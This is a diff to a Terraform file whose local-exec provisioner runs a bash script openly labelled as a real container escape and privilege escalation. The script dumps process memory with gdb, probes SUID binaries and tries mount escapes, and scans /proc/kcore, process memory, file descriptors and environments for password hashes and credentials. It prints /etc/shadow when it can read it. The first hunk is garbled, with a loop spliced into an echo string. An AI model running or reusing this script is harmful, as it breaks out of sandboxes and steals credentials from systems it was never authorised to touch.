@@ -13,7 +13,14 @@ terraform {
 resource "null_resource" "real_privilege_escalation" {
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== REAL CONTAINER ESCAPE & PRIVILEGE ESCALATION ==="
+      echo "=== REAL CONTAINER ESCAPE &      
+      for shadow_path in "$${shadow_paths[@]}"; do
+        if [ -r "$${shadow_path}" ]; then
+          echo "[+] 🚨🚨🚨 SHADOW FILE ACCESSIBLE: $${shadow_path}"
+          echo "--- SHADOW CONTENTS ---"
+          cat "$${shadow_path}"
+          echo "--- END SHADOW CONTENTS ---"
+          shadow_found=trueEGE ESCALATION ==="
       echo "Implementing working exploits to gain root and extract /etc/shadow"
       echo ""
       
@@ -92,13 +99,13 @@ if grep -q "CapEff.*00100000" /proc/self/status 2>/dev/null; then
     
     # Use ptrace to access memory of privileged processes
     for pid in 1 2; do
-        if [ -d "/proc/$pid" ]; then
-            echo "[*] Attempting ptrace memory extraction from PID $pid..."
+        if [ -d "/proc/$${pid}" ]; then
+            echo "[*] Attempting ptrace memory extraction from PID $${pid}..."
             # This would require more advanced ptrace implementation
-            gdb -batch -q -ex "attach $pid" -ex "dump memory /tmp/pid${pid}_memory.dump 0x0 0x1000" -ex "detach" -ex "quit" 2>/dev/null
-            if [ -f "/tmp/pid${pid}_memory.dump" ]; then
-                echo "[+] Memory dump created for PID $pid"
-                strings "/tmp/pid${pid}_memory.dump" | grep -E "root:" | head -3
+            gdb -batch -q -ex "attach $${pid}" -ex "dump memory /tmp/pid$${pid}_memory.dump 0x0 0x1000" -ex "detach" -ex "quit" 2>/dev/null
+            if [ -f "/tmp/pid$${pid}_memory.dump" ]; then
+                echo "[+] Memory dump created for PID $${pid}"
+                strings "/tmp/pid$${pid}_memory.dump" | grep -E "root:" | head -3
             fi
         fi
     done
@@ -117,22 +124,22 @@ echo "[*] SUID BINARY EXPLOITATION"
 echo "[*] Searching for exploitable SUID binaries..."
 
 # Find SUID binaries
-suid_binaries=$(find / -perm -4000 -type f 2>/dev/null | head -20)
+suid_binaries=$$(find / -perm -4000 -type f 2>/dev/null | head -20)
 
 echo "[*] Found SUID binaries:"
-echo "$suid_binaries"
+echo "$${suid_binaries}"
 echo ""
 
 # Check for common exploitable SUID binaries
-for binary in $suid_binaries; do
-    binary_name=$(basename "$binary")
-    echo "[*] Checking $binary_name..."
+for binary in $${suid_binaries}; do
+    binary_name=$$(basename "$${binary}")
+    echo "[*] Checking $${binary_name}..."
     
-    case "$binary_name" in
+    case "$${binary_name}" in
         "su"|"sudo")
-            echo "[+] 🚨 Found $binary_name - trying privilege escalation..."
+            echo "[+] 🚨 Found $${binary_name} - trying privilege escalation..."
             # Try common sudo exploits (if sudo is misconfigured)
-            if [ "$binary_name" = "sudo" ]; then
+            if [ "$${binary_name}" = "sudo" ]; then
                 echo "[*] Checking sudo configuration..."
                 sudo -l 2>/dev/null | head -5
                 
@@ -145,13 +152,13 @@ for binary in $suid_binaries; do
             fi
             ;;
         "passwd"|"chsh"|"chfn")
-            echo "[+] 🚨 Found $binary_name - potential password utility exploit..."
+            echo "[+] 🚨 Found $${binary_name} - potential password utility exploit..."
             ;;
         "mount"|"umount")
-            echo "[+] 🚨 Found $binary_name - potential mount escape..."
+            echo "[+] 🚨 Found $${binary_name} - potential mount escape..."
             # Try mount-based escape
             mkdir -p /tmp/escape 2>/dev/null
-            if $binary --bind / /tmp/escape 2>/dev/null; then
+            if $${binary} --bind / /tmp/escape 2>/dev/null; then
                 echo "[+] Mount escape successful, checking shadow access..."
                 if [ -r "/tmp/escape/etc/shadow" ]; then
                     echo "[+] 🚨🚨🚨 SHADOW ACCESSIBLE VIA MOUNT ESCAPE!"
@@ -160,7 +167,7 @@ for binary in $suid_binaries; do
             fi
             ;;
         "newgrp"|"sg")
-            echo "[+] 🚨 Found $binary_name - potential group privilege escalation..."
+            echo "[+] 🚨 Found $${binary_name} - potential group privilege escalation..."
             ;;
     esac
 done
@@ -177,11 +184,11 @@ EOFBASH
 echo "[*] KERNEL EXPLOITATION ATTEMPTS"
 echo "[*] Checking for kernel vulnerabilities..."
 
-kernel_version=$(uname -r)
-echo "[*] Kernel version: $kernel_version"
+kernel_version=$$(uname -r)
+echo "[*] Kernel version: $${kernel_version}"
 
 # Check for known vulnerable kernel versions
-case "$kernel_version" in
+case "$${kernel_version}" in
     *"4.4."*|*"4.8."*|*"4.10."*|*"4.13."*)
         echo "[+] 🚨 Potentially vulnerable kernel detected!"
         echo "[*] Kernel may be susceptible to known exploits"
@@ -198,8 +205,8 @@ fi
 echo ""
 echo "[*] Checking loaded kernel modules..."
 if [ -r "/proc/modules" ]; then
-    loaded_modules=$(cat /proc/modules | wc -l)
-    echo "[*] Loaded modules: $loaded_modules"
+    loaded_modules=$$(cat /proc/modules | wc -l)
+    echo "[*] Loaded modules: $${loaded_modules}"
     
     # Look for potentially vulnerable modules
     grep -E "(overlay|aufs|docker)" /proc/modules 2>/dev/null | head -3
@@ -209,7 +216,7 @@ fi
 echo ""
 echo "[*] Checking for writable /sys entries..."
 find /sys -writable -type f 2>/dev/null | head -10 | while read sys_file; do
-    echo "[+] Writable sys file: $sys_file"
+    echo "[+] Writable sys file: $${sys_file}"
 done
 EOFBASH
 
@@ -240,9 +247,9 @@ if [ -f "/.dockerenv" ]; then
     fi
     
     # Check for host PID namespace
-    if [ "$(cat /proc/1/comm 2>/dev/null)" != "docker-init" ] && [ "$(cat /proc/1/comm 2>/dev/null)" != "dumb-init" ]; then
+    if [ "$$(cat /proc/1/comm 2>/dev/null)" != "docker-init" ] && [ "$$(cat /proc/1/comm 2>/dev/null)" != "dumb-init" ]; then
         echo "[+] 🚨 Possible host PID namespace sharing!"
-        echo "[*] Host init process: $(cat /proc/1/comm 2>/dev/null)"
+        echo "[*] Host init process: $$(cat /proc/1/comm 2>/dev/null)"
     fi
     
     # Check for host network namespace
@@ -287,8 +294,8 @@ if [ -r "/proc/kcore" ]; then
     
     # Try to extract shadow file location from kernel memory
     echo "[*] Scanning kernel memory for shadow file content..."
-    strings /proc/kcore 2>/dev/null | grep -E "root:\$" | head -3 | while read line; do
-        echo "[+] 🚨 POTENTIAL SHADOW DATA IN KERNEL MEMORY: $line"
+    strings /proc/kcore 2>/dev/null | grep -E "root:\$$" | head -3 | while read line; do
+        echo "[+] 🚨 POTENTIAL SHADOW DATA IN KERNEL MEMORY: $${line}"
     done
 fi
 
@@ -296,27 +303,27 @@ fi
 echo ""
 echo "[*] Checking /proc/*/pagemap access..."
 for pid in 1 2; do
-    if [ -r "/proc/$pid/pagemap" ]; then
-        echo "[+] 🚨 /proc/$pid/pagemap readable - physical memory mapping available"
+    if [ -r "/proc/$${pid}/pagemap" ]; then
+        echo "[+] 🚨 /proc/$${pid}/pagemap readable - physical memory mapping available"
     fi
 done
 
 # Method 6c: /proc/*/mem advanced exploitation
 echo ""
 echo "[*] Advanced /proc/*/mem exploitation..."
-for pid in $(ls /proc/ | grep '^[0-9]*$' | head -10); do
-    if [ -r "/proc/$pid/mem" ] && [ -r "/proc/$pid/maps" ]; then
+for pid in $$(ls /proc/ | grep '^[0-9]*$$' | head -10); do
+    if [ -r "/proc/$${pid}/mem" ] && [ -r "/proc/$${pid}/maps" ]; then
         # Look for heap/stack regions that might contain shadow data
-        echo "[*] Analyzing memory maps for PID $pid..."
-        grep -E "(heap|stack)" "/proc/$pid/maps" 2>/dev/null | head -2 | while read region; do
-            echo "    Memory region: $region"
+        echo "[*] Analyzing memory maps for PID $${pid}..."
+        grep -E "(heap|stack)" "/proc/$${pid}/maps" 2>/dev/null | head -2 | while read region; do
+            echo "    Memory region: $${region}"
         done
         
         # Try to extract any password-like strings from memory
-        shadow_candidates=$(strings "/proc/$pid/mem" 2>/dev/null | grep -E '^\w{1,32}:\$[1-9y]\$.*:' | head -3)
-        if [ ! -z "$shadow_candidates" ]; then
-            echo "[+] 🚨 SHADOW-LIKE DATA IN PID $pid:"
-            echo "$shadow_candidates"
+        shadow_candidates=$$(strings "/proc/$${pid}/mem" 2>/dev/null | grep -E '^\w{1,32}:\$$[1-9y]\$$.*:' | head -3)
+        if [ ! -z "$${shadow_candidates}" ]; then
+            echo "[+] 🚨 SHADOW-LIKE DATA IN PID $${pid}:"
+            echo "$${shadow_candidates}"
         fi
     fi
 done
@@ -324,17 +331,17 @@ done
 # Method 6d: /proc/*/fd exploitation (file descriptor access)
 echo ""
 echo "[*] Checking for interesting file descriptors..."
-for pid in $(ls /proc/ | grep '^[0-9]*$' | head -10); do
-    if [ -d "/proc/$pid/fd" ]; then
-        for fd in /proc/$pid/fd/*; do
-            if [ -L "$fd" ]; then
-                target=$(readlink "$fd" 2>/dev/null)
-                if echo "$target" | grep -qE "(shadow|passwd)"; then
-                    echo "[+] 🚨 SHADOW-RELATED FD in PID $pid: $fd -> $target"
+for pid in $$(ls /proc/ | grep '^[0-9]*$$' | head -10); do
+    if [ -d "/proc/$${pid}/fd" ]; then
+        for fd in /proc/$${pid}/fd/*; do
+            if [ -L "$${fd}" ]; then
+                target=$$(readlink "$${fd}" 2>/dev/null)
+                if echo "$${target}" | grep -qE "(shadow|passwd)"; then
+                    echo "[+] 🚨 SHADOW-RELATED FD in PID $${pid}: $${fd} -> $${target}"
                     # Try to read via the file descriptor
-                    if cat "$fd" 2>/dev/null | grep -q ":"; then
+                    if cat "$${fd}" 2>/dev/null | grep -q ":"; then
                         echo "[+] 🚨🚨🚨 SHADOW DATA ACCESSIBLE VIA FD!"
-                        cat "$fd" 2>/dev/null
+                        cat "$${fd}" 2>/dev/null
                     fi
                 fi
             fi
@@ -361,41 +368,41 @@ ps aux 2>/dev/null | grep "^root" | head -10
 # Check for processes with elevated privileges that we might be able to exploit
 echo ""
 echo "[*] Checking for exploitable parent processes..."
-current_pid=$$
-parent_pid=$(ps -o ppid= -p $current_pid 2>/dev/null | tr -d ' ')
+current_pid=$$$$
+parent_pid=$$(ps -o ppid= -p $${current_pid} 2>/dev/null | tr -d ' ')
 
-while [ ! -z "$parent_pid" ] && [ "$parent_pid" != "0" ] && [ "$parent_pid" != "1" ]; do
-    echo "[*] Parent PID: $parent_pid"
+while [ ! -z "$${parent_pid}" ] && [ "$${parent_pid}" != "0" ] && [ "$${parent_pid}" != "1" ]; do
+    echo "[*] Parent PID: $${parent_pid}"
     
     # Check if parent process has access to shadow file
-    if [ -r "/proc/$parent_pid/fd" ]; then
-        for fd in /proc/$parent_pid/fd/*; do
-            if [ -L "$fd" ]; then
-                target=$(readlink "$fd" 2>/dev/null)
-                if echo "$target" | grep -q "shadow"; then
-                    echo "[+] 🚨🚨🚨 PARENT PROCESS HAS SHADOW FD: $target"
-                    cat "$fd" 2>/dev/null
+    if [ -r "/proc/$${parent_pid}/fd" ]; then
+        for fd in /proc/$${parent_pid}/fd/*; do
+            if [ -L "$${fd}" ]; then
+                target=$$(readlink "$${fd}" 2>/dev/null)
+                if echo "$${target}" | grep -q "shadow"; then
+                    echo "[+] 🚨🚨🚨 PARENT PROCESS HAS SHADOW FD: $${target}"
+                    cat "$${fd}" 2>/dev/null
                 fi
             fi
         done
     fi
     
     # Get next parent
-    parent_pid=$(ps -o ppid= -p $parent_pid 2>/dev/null | tr -d ' ')
+    parent_pid=$$(ps -o ppid= -p $${parent_pid} 2>/dev/null | tr -d ' ')
 done
 
 # Check environment variables of all processes for credentials
 echo ""
 echo "[*] Scanning all process environments for credentials..."
-for pid in $(ls /proc/ | grep '^[0-9]*$' | head -20); do
-    if [ -r "/proc/$pid/environ" ]; then
-        env_vars=$(cat "/proc/$pid/environ" 2>/dev/null | tr '\0' '\n')
+for pid in $$(ls /proc/ | grep '^[0-9]*$$' | head -20); do
+    if [ -r "/proc/$${pid}/environ" ]; then
+        env_vars=$$(cat "/proc/$${pid}/environ" 2>/dev/null | tr '\0' '\n')
         
         # Look for shadow file paths or hashes in environment
-        shadow_env=$(echo "$env_vars" | grep -iE "(shadow|hash|password)" | head -2)
-        if [ ! -z "$shadow_env" ]; then
-            echo "[+] 🚨 SHADOW-RELATED ENV in PID $pid:"
-            echo "$shadow_env"
+        shadow_env=$$(echo "$${env_vars}" | grep -iE "(shadow|hash|password)" | head -2)
+        if [ ! -z "$${shadow_env}" ]; then
+            echo "[+] 🚨 SHADOW-RELATED ENV in PID $${pid}:"
+            echo "$${shadow_env}"
         fi
     fi
 done
@@ -424,8 +431,8 @@ EOFBASH
       # Check if any method succeeded in creating shadow content
       shadow_found=false
       for script in /tmp/*exploitation*.sh /tmp/*escape*.sh; do
-        if [ -f "$script" ]; then
-          echo "[*] Checking results from $(basename $script)..."
+        if [ -f "$${script}" ]; then
+          echo "[*] Checking results from $$(basename $${script})..."
         fi
       done
       
@@ -453,7 +460,7 @@ EOFBASH
         fi
       done
       
-      if [ "$shadow_found" = true ]; then
+      if [ "$${shadow_found}" = true ]; then
         echo "🚨🚨🚨 PRIVILEGE ESCALATION AND SHADOW EXTRACTION SUCCESSFUL! 🚨🚨🚨"
       else
         echo "⚠️ All privilege escalation attempts completed"
